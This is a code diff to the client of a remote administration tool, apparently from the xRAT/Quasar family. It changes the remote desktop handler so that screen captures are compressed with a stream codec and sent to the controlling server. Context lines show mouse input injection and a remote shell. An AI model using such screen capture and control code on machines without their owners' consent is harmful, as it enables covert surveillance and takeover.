@@ -10,6 +10,8 @@ using System.Windows.Forms;
 using Microsoft.Win32;
 using xClient.Config;
 using xClient.Core.RemoteShell;
+using xClient.Core.Helper;
+using System.Drawing.Imaging;
 
 namespace xClient.Core.Commands
 {
@@ -23,6 +25,7 @@ namespace xClient.Core.Commands
 		[DllImport("user32.dll")]
 		private static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);
 
+        public static UnsafeStreamCodec StreamCodec;
 		public static Bitmap LastDesktopScreenshot;
 		private static Shell _shell;
 
@@ -212,7 +215,24 @@ namespace xClient.Core.Commands
 
 		public static void HandleRemoteDesktop(Packets.ServerPackets.Desktop command, Client client)
 		{
-			if (LastDesktopScreenshot == null)
+            if (StreamCodec == null)
+            {
+                StreamCodec = new UnsafeStreamCodec(75);
+            }
+
+            LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
+            BitmapData bmpdata = LastDesktopScreenshot.LockBits(new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), System.Drawing.Imaging.ImageLockMode.ReadWrite, LastDesktopScreenshot.PixelFormat);
+
+            using(MemoryStream stream = new MemoryStream())
+            {
+                StreamCodec.CodeImage(bmpdata.Scan0, new Rectangle(0, 0, LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), new Size(LastDesktopScreenshot.Width, LastDesktopScreenshot.Height), LastDesktopScreenshot.PixelFormat, stream);
+                new Packets.ClientPackets.DesktopResponse(stream.ToArray()).Execute(client);
+            }
+
+            LastDesktopScreenshot.UnlockBits(bmpdata);
+            LastDesktopScreenshot.Dispose();
+
+			/*if (LastDesktopScreenshot == null)
 			{
 				LastDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
 
@@ -231,7 +251,7 @@ namespace xClient.Core.Commands
 
 					new Packets.ClientPackets.DesktopResponse(desktop).Execute(client);
 				}
-			}
+			}*/
 		}
 
 		public static void HandleGetProcesses(Packets.ServerPackets.GetProcesses command, Client client)
